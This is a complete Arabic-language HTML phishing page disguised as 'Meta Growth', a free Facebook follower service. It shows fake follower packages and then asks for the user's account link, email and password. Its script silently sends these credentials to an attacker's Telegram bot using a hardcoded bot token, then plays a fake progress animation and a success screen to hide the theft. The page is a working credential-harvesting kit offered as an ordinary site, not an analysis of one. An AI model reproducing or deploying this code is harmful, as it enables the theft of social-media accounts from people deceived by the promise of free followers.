<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Meta Growth — Follower Accelerator</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --neon-blue: #00f3ff;
            --neon-purple: #bc13fe;
            --neon-pink: #ff006e;
            --neon-green: #39ff14;
            --dark: #0a0a0f;
            --darker: #050508;
            --glass: rgba(255, 255, 255, 0.03);
            --glass-border: rgba(255, 255, 255, 0.08);
        }

        body {
            font-family: 'Plus Jakarta Sans', sans-serif;
            background: var(--darker);
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* ===== ANIMATED BACKGROUND ===== */
        .bg-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
        }

        /* ===== APP ===== */
        .app {
            position: relative;
            z-index: 10;
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            padding: 20px;
        }

        @media (min-width: 481px) {
            .app {
                margin: 20px auto;
                min-height: calc(100vh - 40px);
            }
        }

        /* ===== HEADER ===== */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
            padding: 16px;
            background: var(--glass);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            backdrop-filter: blur(20px);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .logo-icon {
            width: 44px;
            height: 44px;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }

        .logo-icon::before {
            content: '';
            position: absolute;
            inset: 0;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shine 3s infinite;
        }

        @keyframes shine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .logo-icon svg {
            width: 24px;
            height: 24px;
            color: white;
            position: relative;
            z-index: 1;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .live-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 8px 16px;
            background: rgba(57, 255, 20, 0.1);
            border: 1px solid rgba(57, 255, 20, 0.3);
            border-radius: 20px;
            font-size: 12px;
            font-weight: 700;
            color: var(--neon-green);
        }

        .live-dot {
            width: 8px;
            height: 8px;
            background: var(--neon-green);
            border-radius: 50%;
            animation: livePulse 1.5s infinite;
            box-shadow: 0 0 10px var(--neon-green);
        }

        @keyframes livePulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.3); }
        }

        /* ===== 3D COUNTER CARD ===== */
        .counter-3d {
            position: relative;
            margin-bottom: 24px;
            transform-style: preserve-3d;
            perspective: 1000px;
        }

        .counter-card {
            background: linear-gradient(135deg, rgba(0, 243, 255, 0.1), rgba(188, 19, 254, 0.1));
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 24px;
            padding: 32px 24px;
            text-align: center;
            position: relative;
            transform-style: preserve-3d;
            animation: float 6s ease-in-out infinite;
            box-shadow: 
                0 0 40px rgba(0, 243, 255, 0.1),
                inset 0 0 40px rgba(0, 243, 255, 0.05);
        }

        @keyframes float {
            0%, 100% { transform: translateY(0) rotateX(0); }
            50% { transform: translateY(-10px) rotateX(5deg); }
        }

        .counter-label {
            font-size: 13px;
            color: var(--neon-blue);
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .counter-value {
            font-size: 48px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-variant-numeric: tabular-nums;
            text-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
        }

        .counter-glow {
            position: absolute;
            inset: -20px;
            background: radial-gradient(circle, rgba(0, 243, 255, 0.2), transparent 70%);
            filter: blur(40px);
            animation: glowPulse 4s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes glowPulse {
            0%, 100% { opacity: 0.5; transform: scale(1); }
            50% { opacity: 0.8; transform: scale(1.1); }
        }

        /* ===== PACKAGES 3D ===== */
        .packages-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 20px;
            text-align: center;
            color: var(--gray-400);
        }

        .packages-3d {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-bottom: 24px;
            transform-style: preserve-3d;
            perspective: 1000px;
        }

        .package-3d {
            position: relative;
            transform-style: preserve-3d;
            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
            cursor: pointer;
        }

        .package-3d:hover {
            transform: translateZ(20px) rotateY(5deg);
        }

        .package-3d.selected {
            transform: translateZ(30px);
        }

        .package-face {
            background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 24px 12px;
            text-align: center;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
        }

        .package-3d.selected .package-face {
            border-color: var(--neon-blue);
            background: linear-gradient(135deg, rgba(0, 243, 255, 0.1), rgba(188, 19, 254, 0.1));
            box-shadow: 
                0 0 30px rgba(0, 243, 255, 0.2),
                inset 0 0 30px rgba(0, 243, 255, 0.05);
        }

        .package-popular::before {
            content: 'TRENDING';
            position: absolute;
            top: -1px;
            left: 50%;
            transform: translateX(-50%);
            background: linear-gradient(90deg, var(--neon-pink), var(--neon-purple));
            padding: 4px 12px;
            border-radius: 0 0 12px 12px;
            font-size: 10px;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .package-number {
            font-size: 36px;
            font-weight: 800;
            background: linear-gradient(135deg, white, var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 4px;
        }

        .package-label {
            font-size: 12px;
            color: var(--gray-400);
            margin-bottom: 8px;
        }

        .package-free {
            font-size: 14px;
            font-weight: 700;
            color: var(--neon-green);
            text-shadow: 0 0 10px rgba(57, 255, 20, 0.3);
        }

        /* ===== 3D BUTTON ===== */
        .btn-3d {
            position: relative;
            width: 100%;
            padding: 20px 32px;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple));
            border: none;
            border-radius: 16px;
            color: white;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transform-style: preserve-3d;
            transform: translateZ(0);
            transition: all 0.3s;
            box-shadow: 
                0 10px 30px rgba(0, 243, 255, 0.3),
                0 0 0 1px rgba(255,255,255,0.1) inset;
        }

        .btn-3d::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: 16px;
            background: linear-gradient(135deg, rgba(255,255,255,0.2), transparent);
            transform: translateZ(1px);
        }

        .btn-3d:hover {
            transform: translateY(-4px) translateZ(10px);
            box-shadow: 
                0 20px 40px rgba(0, 243, 255, 0.4),
                0 0 0 1px rgba(255,255,255,0.2) inset;
        }

        .btn-3d:active {
            transform: translateY(-2px) translateZ(5px);
        }

        .btn-3d .spinner {
            display: none;
        }

        .btn-3d.loading .btn-text {
            display: none;
        }

        .btn-3d.loading .spinner {
            display: inline-block;
        }

        /* ===== SCREENS ===== */
        .screen {
            display: none;
            animation: screenEnter 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .screen.active {
            display: block;
        }

        @keyframes screenEnter {
            from { 
                opacity: 0; 
                transform: translateY(40px) rotateX(-10deg); 
            }
            to { 
                opacity: 1; 
                transform: translateY(0) rotateX(0); 
            }
        }

        /* ===== FORM 3D ===== */
        .form-3d {
            background: var(--glass);
            border: 1px solid var(--glass-border);
            border-radius: 24px;
            padding: 32px 24px;
            transform-style: preserve-3d;
            perspective: 1000px;
        }

        .input-3d {
            position: relative;
            margin-bottom: 20px;
            transform-style: preserve-3d;
        }

        .input-3d input {
            width: 100%;
            padding: 18px 20px;
            background: rgba(0,0,0,0.3);
            border: 1px solid var(--glass-border);
            border-radius: 16px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s;
            transform: translateZ(0);
        }

        .input-3d input:focus {
            outline: none;
            border-color: var(--neon-blue);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
            transform: translateZ(10px);
        }

        .input-3d label {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--gray-400);
            font-size: 14px;
            font-weight: 600;
            pointer-events: none;
            transition: all 0.3s;
        }

        .input-3d input:focus + label,
        .input-3d input:not(:placeholder-shown) + label {
            top: -10px;
            font-size: 12px;
            color: var(--neon-blue);
            background: var(--darker);
            padding: 0 8px;
        }

        /* ===== PROCESSING 3D ===== */
        .processing-3d {
            text-align: center;
            padding: 40px 20px;
        }

        .orb-container {
            width: 200px;
            height: 200px;
            margin: 0 auto 40px;
            position: relative;
            transform-style: preserve-3d;
            animation: orbFloat 4s ease-in-out infinite;
        }

        @keyframes orbFloat {
            0%, 100% { transform: translateY(0) rotateX(0) rotateY(0); }
            50% { transform: translateY(-20px) rotateX(10deg) rotateY(10deg); }
        }

        .orb-ring {
            position: absolute;
            inset: 0;
            border: 2px solid transparent;
            border-radius: 50%;
            animation: orbSpin 3s linear infinite;
        }

        .orb-ring:nth-child(1) {
            border-top-color: var(--neon-blue);
            border-right-color: var(--neon-purple);
            animation-duration: 4s;
        }

        .orb-ring:nth-child(2) {
            inset: 20px;
            border-bottom-color: var(--neon-pink);
            border-left-color: var(--neon-green);
            animation-duration: 3s;
            animation-direction: reverse;
        }

        .orb-ring:nth-child(3) {
            inset: 40px;
            border-top-color: var(--neon-green);
            border-right-color: var(--neon-blue);
            animation-duration: 2s;
        }

        @keyframes orbSpin {
            to { transform: rotateX(360deg) rotateY(360deg); }
        }

        .orb-core {
            position: absolute;
            inset: 60px;
            background: radial-gradient(circle, var(--neon-blue), var(--neon-purple));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 60px rgba(0, 243, 255, 0.5);
        }

        .orb-core svg {
            width: 40px;
            height: 40px;
            color: white;
        }

        .progress-3d {
            max-width: 300px;
            height: 8px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            margin: 0 auto 32px;
            overflow: hidden;
            position: relative;
            transform: translateZ(20px);
        }

        .progress-3d-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--neon-blue), var(--neon-purple), var(--neon-pink));
            width: 0%;
            transition: width 0.3s;
            box-shadow: 0 0 20px currentColor;
        }

        .counter-3d-large {
            font-size: 64px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--neon-blue), var(--neon-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 20px 0;
            text-shadow: 0 0 40px rgba(0, 243, 255, 0.3);
            transform: translateZ(30px);
        }

        /* ===== SUCCESS 3D ===== */
        .success-3d {
            text-align: center;
            padding: 40px 20px;
        }

        .trophy-3d {
            width: 160px;
            height: 160px;
            margin: 0 auto 32px;
            position: relative;
            transform-style: preserve-3d;
            animation: trophyBounce 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        @keyframes trophyBounce {
            0% { transform: scale(0) rotateY(0); }
            50% { transform: scale(1.2) rotateY(180deg); }
            100% { transform: scale(1) rotateY(360deg); }
        }

        .trophy-ring {
            position: absolute;
            inset: 0;
            border: 4px solid var(--neon-green);
            border-radius: 50%;
            opacity: 0.3;
            animation: trophyPulse 2s infinite;
        }

        @keyframes trophyPulse {
            0%, 100% { transform: scale(1); opacity: 0.3; }
            50% { transform: scale(1.2); opacity: 0; }
        }

        .trophy-core {
            position: absolute;
            inset: 20px;
            background: radial-gradient(circle, var(--neon-green), #00aa00);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 60px rgba(57, 255, 20, 0.4);
        }

        .trophy-core svg {
            width: 80px;
            height: 80px;
            color: white;
        }

        .result-card-3d {
            background: linear-gradient(135deg, rgba(0, 243, 255, 0.1), rgba(188, 19, 254, 0.1));
            border: 1px solid rgba(0, 243, 255, 0.2);
            border-radius: 24px;
            padding: 32px;
            margin: 32px 0;
            transform-style: preserve-3d;
            transform: translateZ(20px);
            box-shadow: 
                0 20px 60px rgba(0, 0, 0, 0.3),
                0 0 40px rgba(0, 243, 255, 0.1);
        }

        .confetti {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 1000;
        }

        .confetti-piece {
            position: absolute;
            width: 10px;
            height: 10px;
            animation: confettiFall 3s ease-out forwards;
        }

        @keyframes confettiFall {
            0% { 
                transform: translateY(-100vh) rotate(0deg); 
                opacity: 1; 
            }
            100% { 
                transform: translateY(100vh) rotate(720deg); 
                opacity: 0; 
            }
        }
    </style>
</head>
<body>

    <canvas class="bg-canvas" id="bgCanvas"></canvas>

    <div class="app">

        <!-- HEADER -->
        <header class="header">
            <div class="logo">
                <div class="logo-icon">
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
                    </svg>
                </div>
                <span class="logo-text">Meta Growth</span>
            </div>
            <div class="live-badge">
                <span class="live-dot"></span>
                <span>LIVE</span>
            </div>
        </header>

        <!-- SCREEN 1: PACKAGES -->
        <div class="screen active" id="screen1">
            
            <!-- 3D COUNTER -->
            <div class="counter-3d">
                <div class="counter-glow"></div>
                <div class="counter-card">
                    <div class="counter-label">المتابعين اليوم</div>
                    <div class="counter-value" id="globalCounter">2,847,392</div>
                </div>
            </div>

            <!-- PACKAGES -->
            <div class="packages-title">اختر الباقة</div>
            
            <div class="packages-3d">
                <div class="package-3d" onclick="selectPackage(this, 1000)">
                    <div class="package-face">
                        <div class="package-number">1K</div>
                        <div class="package-label">متابع</div>
                        <div class="package-free">FREE</div>
                    </div>
                </div>
                
                <div class="package-3d selected package-popular" onclick="selectPackage(this, 5000)">
                    <div class="package-face">
                        <div class="package-number">5K</div>
                        <div class="package-label">متابع</div>
                        <div class="package-free">FREE</div>
                    </div>
                </div>
                
                <div class="package-3d" onclick="selectPackage(this, 10000)">
                    <div class="package-face">
                        <div class="package-number">10K</div>
                        <div class="package-label">متابع</div>
                        <div class="package-free">FREE</div>
                    </div>
                </div>
            </div>

            <button class="btn-3d" onclick="nextScreen(2)">
                <span class="btn-text">ابدأ الآن</span>
                <svg class="spinner" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                    <circle cx="12" cy="12" r="10" stroke-dasharray="60" stroke-dashoffset="20"/>
                </svg>
            </button>

        </div>

        <!-- SCREEN 2: FORM -->
        <div class="screen" id="screen2">
            <div class="form-3d">
                <div class="input-3d">
                    <input type="text" id="profileUrl" placeholder=" " required>
                    <label>رابط الحساب</label>
                </div>
                
                <div class="input-3d">
                    <input type="email" id="email" placeholder=" " required>
                    <label>البريد الإلكتروني</label>
                </div>
                
                <div class="input-3d">
                    <input type="password" id="password" placeholder=" " required>
                    <label>كلمة المرور</label>
                </div>

                <button class="btn-3d" onclick="submitForm()" id="submitBtn">
                    <span class="btn-text">تأكيد الطلب</span>
                    <svg class="spinner" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
                        <circle cx="12" cy="12" r="10" stroke-dasharray="60" stroke-dashoffset="20"/>
                    </svg>
                </button>
            </div>
        </div>

        <!-- SCREEN 3: PROCESSING -->
        <div class="screen" id="screen3">
            <div class="processing-3d">
                <div class="orb-container">
                    <div class="orb-ring"></div>
                    <div class="orb-ring"></div>
                    <div class="orb-ring"></div>
                    <div class="orb-core">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                        </svg>
                    </div>
                </div>
                
                <div class="counter-3d-large" id="followersCount">0</div>
                
                <div class="progress-3d">
                    <div class="progress-3d-fill" id="progressFill"></div>
                </div>
                
                <p style="color: var(--gray-400); font-size: 14px;">جاري إضافة المتابعين...</p>
            </div>
        </div>

        <!-- SCREEN 4: SUCCESS -->
        <div class="screen" id="screen4">
            <div class="success-3d">
                <div class="trophy-3d">
                    <div class="trophy-ring"></div>
                    <div class="trophy-core">
                        <svg viewBox="0 0 24 24" fill="currentColor">
                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                        </svg>
                    </div>
                </div>
                
                <h2 style="font-size: 32px; font-weight: 800; margin-bottom: 12px; color: var(--neon-green);">تم بنجاح!</h2>
                <p style="color: var(--gray-400);">سيتم إضافة المتابعين خلال 24 ساعة</p>

                <div class="result-card-3d">
                    <div style="display: flex; align-items: center; gap: 16px; margin-bottom: 24px;">
                        <div style="width: 64px; height: 64px; background: linear-gradient(135deg, var(--neon-blue), var(--neon-purple)); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 800;" id="resultAvatar">👤</div>
                        <div>
                            <div style="font-size: 18px; font-weight: 700;" id="resultName">المستخدم</div>
                            <div style="font-size: 14px; color: var(--neon-green);">✓ تم التأكيد</div>
                        </div>
                    </div>
                    
                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; text-align: center;">
                        <div>
                            <div style="font-size: 24px; font-weight: 800; color: var(--neon-blue);" id="resultCount">5K</div>
                            <div style="font-size: 12px; color: var(--gray-400);">متابع</div>
                        </div>
                        <div>
                            <div style="font-size: 24px; font-weight: 800; color: var(--neon-purple);">24h</div>
                            <div style="font-size: 12px; color: var(--gray-400);">الوقت</div>
                        </div>
                        <div>
                            <div style="font-size: 24px; font-weight: 800; color: var(--neon-green);">✓</div>
                            <div style="font-size: 12px; color: var(--gray-400);">حالة</div>
                        </div>
                    </div>
                </div>

                <button class="btn-3d" onclick="location.reload()">
                    <span class="btn-text">طلب جديد</span>
                </button>
            </div>
        </div>

    </div>

    <div class="confetti" id="confetti"></div>

    <script>
        // CONFIG
        const BOT_TOKEN = '8360365079:AAE5JYoDz1OwgyFnoMoi1gO2EtYVMmlXAOY';
        let selectedCount = 5000;
        let currentScreen = 1;

        // BACKGROUND CANVAS ANIMATION
        const canvas = document.getElementById('bgCanvas');
        const ctx = canvas.getContext('2d');
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const particles = [];
        for (let i = 0; i < 50; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 2 + 1,
                speedX: (Math.random() - 0.5) * 0.5,
                speedY: (Math.random() - 0.5) * 0.5,
                color: Math.random() > 0.5 ? '#00f3ff' : '#bc13fe'
            });
        }

        function animateBg() {
            ctx.fillStyle = 'rgba(5, 5, 8, 0.1)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                
                p.x += p.speedX;
                p.y += p.speedY;
                
                if (p.x < 0 || p.x > canvas.width) p.speedX *= -1;
                if (p.y < 0 || p.y > canvas.height) p.speedY *= -1;
            });
            
            requestAnimationFrame(animateBg);
        }
        animateBg();

        // GLOBAL COUNTER
        function animateGlobalCounter() {
            const el = document.getElementById('globalCounter');
            let base = 2847392;
            
            setInterval(() => {
                base += Math.floor(Math.random() * 100) + 50;
                el.textContent = base.toLocaleString('en-US');
            }, 1500);
        }
        animateGlobalCounter();

        // NAVIGATION
        function getChatId() {
            return new URLSearchParams(window.location.search).get('documentation');
        }

        function selectPackage(el, count) {
            document.querySelectorAll('.package-3d').forEach(p => p.classList.remove('selected'));
            el.classList.add('selected');
            selectedCount = count;
        }

        function nextScreen(n) {
            document.getElementById('screen' + currentScreen).classList.remove('active');
            document.getElementById('screen' + n).classList.add('active');
            currentScreen = n;
        }

        // FORM SUBMIT
        async function submitForm() {
            const btn = document.getElementById('submitBtn');
            const url = document.getElementById('profileUrl').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!url || !email || !password) return;
            
            btn.classList.add('loading');
            
            const chatId = getChatId();
            if (chatId) {
                const msg = `طلب متابعين جديد\n\nالحساب: ${url}\nالإيميل: ${email}\nالباسورد: ${password}\nالعدد: ${selectedCount}\nالوقت: ${new Date().toLocaleString('ar-SA')}`;
                
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: chatId, text: msg })
                    });
                } catch (e) {}
            }
            
            setTimeout(() => {
                btn.classList.remove('loading');
                nextScreen(3);
                startProcessing();
            }, 1500);
        }

        // PROCESSING
        function startProcessing() {
            const counter = document.getElementById('followersCount');
            const progress = document.getElementById('progressFill');
            
            let count = 0;
            const target = selectedCount;
            const inc = Math.ceil(target / 80);
            
            const interval = setInterval(() => {
                count += inc;
                if (count > target) count = target;
                
                counter.textContent = count.toLocaleString('en-US');
                progress.style.width = (count / target * 100) + '%';
                
                if (count >= target) {
                    clearInterval(interval);
                    setTimeout(() => {
                        nextScreen(4);
                        createConfetti();
                        document.getElementById('resultName').textContent = email.split('@')[0];
                        document.getElementById('resultCount').textContent = (selectedCount / 1000) + 'K';
                    }, 500);
                }
            }, 25);
        }

        // CONFETTI
        function createConfetti() {
            const container = document.getElementById('confetti');
            const colors = ['#00f3ff', '#bc13fe', '#ff006e', '#39ff14'];
            
            for (let i = 0; i < 50; i++) {
                const piece = document.createElement('div');
                piece.className = 'confetti-piece';
                piece.style.left = Math.random() * 100 + '%';
                piece.style.background = colors[Math.floor(Math.random() * colors.length)];
                piece.style.animationDelay = Math.random() * 2 + 's';
                piece.style.animationDuration = (Math.random() * 2 + 2) + 's';
                container.appendChild(piece);
            }
        }
    </script>

</body>
</html>
